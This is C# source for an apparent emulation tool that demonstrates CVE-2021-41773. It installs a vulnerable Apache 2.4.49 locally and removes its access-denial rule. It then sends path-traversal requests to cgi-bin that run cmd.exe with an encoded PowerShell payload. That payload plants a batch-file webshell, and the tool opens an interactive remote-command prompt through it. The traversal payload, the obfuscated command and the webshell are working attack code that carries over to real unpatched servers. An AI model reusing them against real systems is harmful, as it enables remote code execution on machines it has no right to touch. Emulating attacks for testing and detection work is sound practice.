using System.Diagnostics;
using System.IO.Compression;

namespace emu
{
    class apache
    {
        static bool ApacheSetup(string OSroot)
        {

            // place apache2449.zip in \Users\public\
            var zipFile = ApacheEmu.Resources.Resource1.apache2449;
            using var writer = new BinaryWriter(File.OpenWrite(OSroot + @"Users\Public\apache2449.zip"));
            writer.Write(zipFile);
            writer.Close();

            // decompress zip to apache folder
            ZipFile.ExtractToDirectory(OSroot + @"Users\Public\apache2449.zip", OSroot + @"Users\public\apache");

            // strip 'Require All Denied' line from httpd.conf
            string[] configFile = File.ReadAllLines(OSroot + @"Users\Public\apache\apache24\conf\httpd.conf");
            configFile[240] = "";
            configFile[38] = "Define SRVROOT \"" + OSroot + @"Users/Public/apache/Apache24" + "\"";
            File.WriteAllLines(OSroot + @"Users\public\apache\apache24\conf\httpd.conf", configFile);

            return true;
        }

        static bool ApacheServer(string arg, string OSroot)
        {
            Process apache = new Process();

            if (arg == "start")
            {

                // start apache server as background process
                apache.StartInfo.FileName = OSroot + @"Users\Public\apache\Apache24\bin\httpd.exe";
                apache.StartInfo.CreateNoWindow = true;
                apache.StartInfo.UseShellExecute = false;
                apache.StartInfo.RedirectStandardOutput = true;
                apache.StartInfo.RedirectStandardError = true;
                apache.Start();

                string ErrorOut = apache.StandardError.ReadToEnd();

                if (ErrorOut.Any())
                {
                    Console.WriteLine(ErrorOut);
                    var dir = new DirectoryInfo(OSroot + @"Users\Public\apache");
                    dir.Delete(true);
                    File.Delete(OSroot + @"Users\Public\c.bat");
                    File.Delete(OSroot + @"Users\Public\Apache2449.zip");
                    Console.Write("cleanup complete... Press Space to close window");
                    Console.ReadKey();
                    Environment.Exit(0);
                }
                //Console.WriteLine("Server is started");
            }
            else if (arg == "stop")
            {
                // get instances of apache running as processed and stop them
                Process[] workers = Process.GetProcessesByName("httpd");
                foreach (Process worker in workers)
                {
                    worker.Kill();
                    worker.WaitForExit();
                    worker.Dispose();
                }
            }

            return true;
        }

        static string SendRequest(string OSroot, string cmd)
        {
            int counter = 0;
            Process commandProcess = new Process();
            commandProcess.StartInfo.FileName = OSroot + @"Windows\System32\curl.exe";
            if (cmd == "setup")
            {
                commandProcess.StartInfo.Arguments = "-s --path-as-is \"http://127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/Windows/System32/cmd.exe?/c%20powershell.exe%20-NoProfile%20-encodedCommand%20JABzAHQAcgA9AEAAIgANAAoAQABlAGMAaABvACAAbwBmAGYAIAAmACYAIABlAGMAaABvACAAQwBvAG4AdABlAG4AdAAtAHQAeQBwAGUAOgB0AGUAeAB0AC8AcABsAGEAaQBuACAAJgAmACAAZQBjAGgAbwAuAA0ACgBlAGMAaABvACAAJQAxAA0ACgBwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIAAtAE4AbwBMAG8AZwBvACAALQBOAG8AUAByAG8AZgBpAGwAZQAgAC0AQwBvAG0AbQBhAG4AZAAgACIAJQAxACAAfAAgAE8AdQB0AC0AZgBpAGwAZQAgAC0ARQBuAGMAbwBkAGkAbgBnACAAdQB0AGYAOAAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXAByAC4AdAB4AHQAIgANAAoAdAB5AHAAZQAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAcgAuAHQAeAB0AA0ACgBkAGUAbAAgAEMAOgBcAFUAcwBlAHIAcwBcAFAAdQBiAGwAaQBjAFwAcgAuAHQAeAB0AA0ACgAiAEAADQAKAFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAJABzAHQAcgAgAHwAIABPAHUAdAAtAGYAaQBsAGUAIAAtAEUAbgBjAG8AZABpAG4AZwAgAGEAcwBjAGkAaQAgAC0ARgBpAGwAZQBQAGEAdABoACAAQwA6AFwAVQBzAGUAcgBzAFwAUAB1AGIAbABpAGMAXABjAC4AYgBhAHQA\"";
            }
            else if (cmd == "exit")
            {
                ApacheServer("stop", OSroot);
                var dir = new DirectoryInfo(OSroot + @"Users\Public\apache");
                dir.Delete(true);
                File.Delete(OSroot + @"Users\Public\c.bat");
                File.Delete(OSroot + @"Users\Public\Apache2449.zip");
                Environment.Exit(0);
            }
            else
            {
                commandProcess.StartInfo.Arguments = "-s --path-as-is \"http://127.0.0.1/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/Users/Public/c.bat?" + cmd;
            }
            commandProcess.StartInfo.UseShellExecute = false;
            commandProcess.StartInfo.CreateNoWindow = true;
            commandProcess.StartInfo.RedirectStandardOutput = true;
            commandProcess.StartInfo.RedirectStandardError = true;
            commandProcess.Start();
            while (!commandProcess.HasExited && counter <= 50)
            {
                System.Threading.Thread.Sleep(100);
                counter++;
            }
            string output = commandProcess.StandardOutput.ReadToEnd();
            Console.WriteLine(commandProcess.StandardError.ReadToEnd());

            return output;
        }

        static void exploit(string OSroot)
        {
            string cmd = "";
            while (cmd != "exit")
            {
                Console.Write(">>>  ");
                cmd = Console.ReadLine();
                cmd = cmd.Replace(" ", "%20");

                string output = SendRequest(OSroot, cmd);
                Console.WriteLine(output);
            }
        }

        private static void Main(string[] args)
        {
            string OSroot = Path.GetPathRoot(Environment.SystemDirectory);
            bool flag1 = ApacheSetup(OSroot);
            bool flag2 = ApacheServer("start", OSroot);
            // test input
            if (flag1 == true && flag2 == true && args.Length == 0)
            {
                string[] commands = { "whoami", "systeminfo", "ipconfig /all" };
                SendRequest(OSroot, "setup");
                Thread.Sleep(3000);
                foreach(string command in commands)
                {
                    SendRequest(OSroot,command);
                }
                SendRequest(OSroot, "exit");
            }
            else if(flag1 == true && flag2 == true && args[0] == "-r")
            {
                Console.WriteLine("This program demos CVE-2021-41773 with file navigation and RCE");
                Console.WriteLine(@"As this prompt is showing, apache is now extracted and running in \Users\Public\apache\apache24");
                Console.WriteLine("Type 'setup' to write a batch file to create a reactive session");
                Console.WriteLine("Once 'setup' is completed, enter commands as normal. Try 'whoami', 'ls', 'calc'");
                Console.WriteLine();
                exploit(OSroot);
            }

        }

    }

}

